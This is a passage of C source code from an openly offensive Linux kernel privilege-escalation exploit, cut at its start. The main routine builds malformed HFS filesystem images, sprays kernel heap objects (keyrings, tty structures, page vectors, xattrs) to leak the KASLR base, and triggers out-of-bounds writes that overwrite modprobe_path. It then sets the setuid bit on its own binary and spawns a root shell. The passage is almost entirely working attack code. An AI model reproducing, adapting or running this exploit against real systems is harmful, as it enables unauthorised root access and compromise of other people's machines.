    sprintf(script, "chmod 700 %s\n", modprobe_path);
    system(script);

    write_file("/tmp/z", "\xff\xff\xff\xff\xff\xff\0", 6);
    system("chmod 700 /tmp/z");

    // Trigger modprobe_path
    system("/tmp/z 2>/dev/null");
    printf("[+] setuid bit set\n");
}

int main(char *argc, char **argv)
{
    key_serial_t *id_buffer;
    char *xattr_target_filename;
    struct write4_payload payload;
    pthread_t monitor_thread;
    pid_t pid;
    int status; 

/* Root shell part */    
    uid_t euid = geteuid(); 

    if (euid == 0)
    {
        // Got root!
        printf("[+] Popping root shell, courtesy of @4ttil4sz1a\n");

        setuid(0);
        setgid(0);
        char *args[] = {"/bin/sh", NULL};
        execve("/bin/sh", args, NULL);

        return 0;
    }   

        char *dir_path = malloc(0x200);
    getcwd(dir_path, 0x200);
    char *path = malloc(PATH_MAX);
    readlink("/proc/self/exe", path, PATH_MAX - 1);
    printf("[+] Running at %s\n", path);


    sem_t *sem_pop_shell = make_semaphore(0);

    if(!fork()){
            sem_wait(sem_pop_shell);
            char *args[] = {path, NULL};
            execve(path, args, NULL);
        }

/* Initialization */    

    set_cpu_affinity(0, 0);

    printf("[+] Running as UID=%d, GID=%d\n", getuid(), getgid());

    prepare_mounts();

/* KASLR leak part */    

    prepare_filesystem(hack_hfs_keyring, "/tmp/malformed_ring.raw", 0);

    qemu_mount_oracle("/tmp/malformed_ring.raw", "/dev/loop1", "/tmp/mnt0/");


#ifdef DEBUG_CROSSCACHE
    if (pthread_create(&monitor_thread, NULL, monitor_function, NULL) != 0)
        do_error_exit("Failed to create the monitor thread");
#endif


    id_buffer = spray_keyring(SPRAY_KEY_SIZE_INIT, 0);

    spray_tty_struct(SPRAY_TTY_INITIAL);

    pid = prepare_pgv_system();

    prepare_pgv_pages_cross_oob();

    release_keys(id_buffer, SPRAY_KEY_SIZE_INIT);

    exit_child();

    waitpid(pid, &status, 0);

    printf("[+] Waitpid status %d\n", status);

/* LPE part */

    prepare_filesystem(hack_hfs_modprobe_one, "/tmp/malformed_mod_1.raw", kaslr_base_recovered);

    qemu_mount_oracle("/tmp/malformed_mod_1.raw", "/dev/loop2", "/tmp/mnt1/");

    prepare_filesystem(hack_hfs_modprobe_two, "/tmp/malformed_mod_2.raw", kaslr_base_recovered);

    qemu_mount_oracle("/tmp/malformed_mod_2.raw", "/dev/loop3", "/tmp/mnt2/");

    unshare_setup_xattr(getuid(), getgid());

    printf("UID: %d, GID: %d\n", getuid(), getgid());

    prepare_tmpfs();

    spray_xattr();  

     trigger_oob_xattr();

    check_for_modprobe_overwrite_one(); 

    spray_xattr_two();

    trigger_oob_xattr_two();

    check_for_modprobe_overwrite_two(); 

    set_myself_suid(path);

    printf("[+] Escalating privileges\n");

    sem_post(sem_pop_shell);
    wait(NULL);
    sleep(0x100000);    
}
